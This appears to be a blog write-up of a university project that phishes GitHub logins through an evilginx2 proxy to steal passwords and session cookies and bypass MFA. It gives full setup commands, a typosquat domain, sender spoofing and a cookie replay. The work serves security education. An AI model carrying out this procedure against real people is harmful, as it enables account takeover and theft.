---
date    : 2023-08-12
title   : MITM Attack to Bypass MFA by Hijacking a Target's Web Session With evilginx2
toc     : true

---

## Introduction

This project revolves around the execution and documentation of a man-in-the-middle (MITM) attack, with the goal of intercepting a target's login credentials and session cookie to gain unauthorized access to _github.com_. The attack was facilitated using a server equipped with the evilginx2 framework, thereby capturing all transmitted connections and data. This project was carried out as a component of a university assignment during the period of late 2022 to early 2023, and it received a perfect score of 1.0/1.0.

## Preparations

### Setting up the Server

The cornerstone of the infrastructure is the server --- specifically, a virtual private server (VPS) that operates on the Debian system. The primary components of the VPS are listed in the subsequent [table 1]( {{< ref "mitm_evilginx_phishing.md#table1" >}} ):

<h6 id="table1">Table 1: Components of the VPS</h6>

|                           |              |
|---------------------------|--------------|
| Virtualization technology | KVM          |
| Processor                 | 2 vCPUs      |
| RAM                       | 2GB DDR4 ECC |
| Storage                   | 40GB SSD     |
| Network card              | 1000Mbit/s   |
| IPv4 addresses            | 1            |

Upon finishing fundamental tasks, like integrating the public SSH key into the VPS' `authorized_keys` file and deactivating password authentication for more secure and streamlined access, it's necessary to install both the programming language Go and the evilginx2 framework. 
Installation of Go primarily involves downloading the package, extracting its contents, and incorporating Go into the `PATH` environment variable:
```
root@vps:~# wget https://go.dev/dl/go1.19.4.linux-amd64.tar.gz
root@vps:~# tar -C /usr/local -xzf go1.19.4.linux-amd64.tar.gz
root@vps:~# export PATH=$PATH:/usr/local/go/bin
```

Conversely, the installation process for evilginx2 entails cloning the repository and subsequently compiling it with `make`. To conclude, the `make install` command is executed, following the directives in the repository's Makefile. This involves copying evilginx2's phishlets and templates directory into the `/usr/share/` space, as well as replicating the actual executable for evilginx2 into `/usr/local/bin`:
```
root@vps:~# git clone https://github.com/kgretzky/evilginx2.git
root@vps:~/evilginx2# make
root@vps:~/evilginx2# sudo make install
```

Upon the successful completion of these steps, evilginx2 can be initiated by simply inputting `evilginx`. This command triggers the startup wizard, presenting all available phishlets, as illustrated in the subsequent [figure 1]( {{< ref "mitm_evilginx_phishing.md#figure1" >}}):

<h6 id="figure1">Figure 1: Startup wizard of evilginx2</h6>
<img src=/images/mitm_evilginx/evilginxStart.png width=600 class="center" style="margin-top: 10px" alt="Startup wizard of evilginx2">


### Configuring the Domain

A critical element of phishing attacks involves convincingly impersonating a legitimate service to avoid arousing suspicion from the target. Consequently, a domain needs to be selected and configured to mirror the naming convention of github.com. For this project, the domain `gtihub.de` has been chosen. While it appears authentic at a casual glance, it differs from the legitimate domain name in two ways: 1) the letters `t` and `i` are transposed, and 2) the top-level domain (TLD) is the German country code rather than the generic `.com` TLD commonly used by GitHub.

Upon acquiring the domain, several DNS records must be configured. An address record (A record) for the apex domain `gtihub.de` will be directed towards the server's public IP address `193.30.121.40`. Additionally, two canonical name records (CNAME record) for the subdomains `api.gtihub.de` and `github.gtihub.de` will reference the apex domain `gtihub.de`. The DNS records and their respective values can be found in the subsequent [table 2]( {{< ref "mitm_evilginx_phishing.md#table2" >}} ):

<h6 id="table2">Table 2: DNS records for gtihub.de</h6>

| Host   | Type  | Value         |
|--------|-------|---------------|
| @      | A     | 193.30.121.40 |
| api    | CNAME | @             |
| github | CNAME | @             |


### Configuring evilginx2

Upon the successful installation of the evilginx2 MITM framework and the creation of requisite DNS records, it's time to configure the framework itself. This begins with establishing the domain and public IP address of the server:
```
: config domain gtihub.de
[14:04:37] [inf] server domain set to: gtihub.de
[14:04:37] [war] server ip not set! type: config ip <ip_address>

: config ip 193.30.121.40
[14:04:45] [inf] server IP set to: 193.30.121.40
```

Subsequently, the phishlet is set and enabled. A phishlet, fundamentally, is a YAML file that's been specially tailored to capture data inputted into the fields of the website it was designed for. It is instrumental in website spoofing as it creates a facsimile of the legitimate website. Additionally, evilginx2 automatically generates a free TLS certificate via Let's Encrypt's API for the domains:
```
: phishlets hostname github gtihub.de
[14:07:42] [inf] phishlet ’github’ hostname set to: gtihub.de
[14:07:42] [inf] disabled phishlet ’github’

: phishlets enable github
[14:08:23] [inf] enabled phishlet ’github’
[14:08:23] [inf] setting up certificates for phishlet ’github’...
[14:08:23] [war] failed to load certificate files for phishlet ’github’, domain ’gtihub.de’: open /root/.evilginx/crt/gtihub.de/github.crt: no such file or directory
[14:08:23] [inf] requesting SSL/TLS certificates from LetsEncrypt...
[14:08:39] [+++] successfully set up SSL/TLS certificates for domains: [gtihub.de api.gtihub.de github.gtihub.de]
```

To conclude, a lure is created and the URL, to which the target will be redirected following a successful login, is set to the authentic github.com website:
```
: lures create github
[14:13:53] [inf] created lure with ID: 0

: lures edit 0 redirect_url https://www.github.com
[14:14:06] [inf] redirect_url = 'https://www.github.com'
```


### Quality Assurance

In order to ensure that the previous steps have been properly executed, they can each be individually verified before the actual MITM attack is launched.

To confirm that the web server is functioning appropriately on the VPS, it can either be checked directly on the server using lsof or by conducting a port scan using Netcat from a separate system:
```
root@vps:~# lsof -i :443
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
evilginx 6271 root 9u IPv6 110197 0t0 TCP *:https (LISTEN)
```
```
z@main ~ % nc -zv gtihub.de 443
Connection to gtihub.de port 443 [tcp/https] succeeded!
```

Similarly, the configured DNS can be validated by executing a name lookup and reviewing the records in the answer section. In this instance, the DNS tool `dig` is utilized to query from an external DNS server --- specifically Quad9's security and privacy-centric DNS server `9.9.9.9`. This will display only the A record of the apex domain and the CNAME records of the two subsequent subdomains:
```
root@vps:~# dig @9.9.9.9 A +noall +answer gtihub.de
gtihub.de.              3600       IN      A       193.30.121.40

root@vps:~# dig @9.9.9.9 CNAME +noall +answer api.gtihub.de
api.gtihub.de.          3600       IN      CNAME   gtihub.de.

root@vps:~# dig @9.9.9.9 CNAME +noall +answer github.gtihub.de
github.gtihub.de.       3600       IN      CNAME   gtihub.de.
```


## Performing the MITM Attack


### Sending the Phishing Mail

Executing a successful phishing attack is heavily contingent upon crafting a visually convincing phishing email. Thus, to avert arousing any suspicion regarding the email's design, it's modelled after an authentic email from GitHub. The objective is to instill a sense of urgency in the target, prompting them to click on the prominently displayed `Review activity` button and log into what they assume to be the standard GitHub website. Unbeknownst to them, the link embedded in the highlighted button has been altered to redirect the user to the phishing page constructed by evilginx2. Evilginx2 generates a unique phishing URL, which can be retrieved using the following command:
```
: lures get-url 0
https://gtihub.de/NUOjZlXw
```

In order to further enhance the impression of authenticity, the sender's email address is masked to display the legitimate GitHub address `noreply@github.com`. This can be accomplished by dispatching the email via an SMTP relay server that doesn't necessitate any authentication for forwarding the email. The email and its appearance in the target's inbox can be viewed in [figure 2]( {{< ref "mitm_evilginx_phishing.md#figure2" >}}):

<h6 id="figure2">Figure 2: Phishing e-mail in the target's inbox</h6>
<br>
<img src=/images/mitm_evilginx/phishingMail.png width=500 class="center" style="margin-top: -10px" alt="Phishing e-mail in the target's inbox">


### Intercepting the Session Cookie
The MITM proxy is able to decrypt the target's traffic due to its possession of a TLS certificate. This certificate is used to establish a secure connection between the MITM proxy and the target's browser. As the certificate is signed by the trusted certificate authority Let's Encrypt, the target's browser trusts it. This enables the MITM proxy to decrypt the traffic and access the content of the target's requests and responses. Consequently, there are two layers of transport encryption within the communication. The first layer exists between the target and the phishing website, safeguarding the target's credentials transmitted through the phishing website. The second layer is established between the phishing website and the legitimate GitHub server, ensuring secure communication between the MITM proxy server and the genuine server. In this scenario, the MITM proxy server functions as a "bridge" between the target and the legitimate server, capable of reading and storing the unencrypted data before re-encrypting it over the alternative TLS channel. [Figure 3]( {{< ref "mitm_evilginx_phishing.md#figure3" >}}) depicts the overall structure and communication paths in this context.

<h6 id="figure3">Figure 3: Traffic channels and overall structure of the communication</h6>
<img src=/images/mitm_evilginx/trafficDiagram.png width=800 class="center" style="margin-top: 10px" alt="Traffic channels and overall structure of the communication">


Upon receiving the email, when the target clicks on the highlighted button, they are directed to the landing page of the phishing site created using evilginx2. [Figure 4]( {{< ref "mitm_evilginx_phishing.md#figure4" >}}) showcases this landing page, which is essentially a replica of the legitimate GitHub website. The only discernible difference lies in the URL, as it displays the phishing domain `gtihub.de` instead of the genuine github.com.


<h6 id="figure4">Figure 4: Landing page of the phishing website</h6>
<img src=/images/mitm_evilginx/phishingLanding.png width=400 class="center" style="margin-top: 10px" alt="Landing page of the phishing website">

When the target enters their username and password on the assumed official GitHub website, this information is stored in plain text on the proxy server. Subsequently, the target is prompted to input the time-based one-time password (TOTP) from their smartphone app for two-factor authentication. Once the target provides this TOTP, a legitimate session is established with the GitHub servers, and a session cookie is issued for the duration of the session. In this scenario, the session cookie is intercepted by evilginx2 before being relayed to the target to establish the session:
```
[22:42:33] [imp] [0] [github] new visitor has arrived: Mozilla/5.0 (Macintosh; Intel
Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0 (1.2.3.4)
[22:43:37] [+++] [0] Username: [first.last@mail.com]
[22:43:37] [+++] [0] Password: [S3cR3tP@$$w0Rd]
[22:43:52] [+++] [0] all authorization tokens intercepted!

: sessions
+-----+-----------+-------------------+-----------------+-----------+------------+-------------------+
| id  | phishlet  | username          | password        | tokens    | remote ip  | time              |
+-----+-----------+-------------------+-----------------+-----------+------------+-------------------+
| 1   | github    | first.last@ma...  | S3cR3tP@$$w0Rd  | captured  | 1.2.3.4    | 2023-02-18 14:31  |
+-----+-----------+-------------------+-----------------+-----------+------------+-------------------+
```


### Replay Attack Using the Intercepted Session Cookie

After obtaining the valid session cookie in the previous step, it can be extracted as the server logs it in plain text:
```
: sessions 1
...
[{"path":"/","domain":"github.com","expirationDate":1674510247,"value":"yes","name":"logged_in","httpOnly":true},{"path":"/","domain":"github.com","expirationDate":1674510247,"value":"zPseudonym","name":"dotcom_user","httpOnly":true},{"path":"/","domain":"github.com","expirationDate":1674510247,"value":"eCPeifWT2dk96Nj1n5e0U95YVgstZpDsw5OQTp6UHk2XhrR3dokBZANVgF%2FFRDnjOmBvhJNH7UDFy9ao3sSumBc4heaWmwhPzpaEuwDcb3IPX5o8dIpSLITW0VmHvapjKGga6AJvyLu6QxehklG6MU3rZyQlWBO%2FyuCYXbno4ydhh6vhYwvmaiBgch2W2uzwcVunZhGejcstItcRYQHFNU4KrJapno8e%2BA7dJZM2lORIgZO0ZnK1%2B3PMFgl2M8mNR0ooOqKAMkmjbenY9shM2w%3D%3D--4wUn7Xoc4gnuRFzu--MuN4n11lgVrqeJovTwItZQ%3D%3D","name":"_gh_sess","httpOnly":true,"hostOnly":true},{"path":"/","domain":"github.com","expirationDate":1674510247,"value":"8iJl7yASEUr3Pm_OCLY5LGCyw97Rckzj95DptjF-csyoEdMU","name":"user_session","httpOnly":true,"hostOnly":true}]
```

This captured cookie can easily be imported into the attacker's browser by using a third-party browser extension such as EditThisCookie, as shown in the following [figure 5]( {{< ref "mitm_evilginx_phishing.md#figure5" >}}):

<h6 id="figure5">Figure 5: Importing the intercepted session cookie with EditThisCookie</h6>
<img src=/images/mitm_evilginx/editThisCookie.png width=500 class="center" style="margin-top: 10px" alt="Importing the intercepted session cookie with EditThisCookie">

Subsequently, access to the official github.com website becomes available without any additional authentication prompts. Complete access to all resources within the platform is granted. [Figure 6]( {{< ref "mitm_evilginx_phishing.md#figure6" >}}) depicts the repository screen within GitHub after successfully circumventing the authentication process by simply reloading the GitHub website following the importation of the intercepted session cookie:

<h6 id="figure6">Figure 6: Obtaining full access to GitHub</h6>
<img src=/images/mitm_evilginx/githubAccess.png width=500 class="center" style="margin-top: 10px" alt="Obtaining full access to GitHub">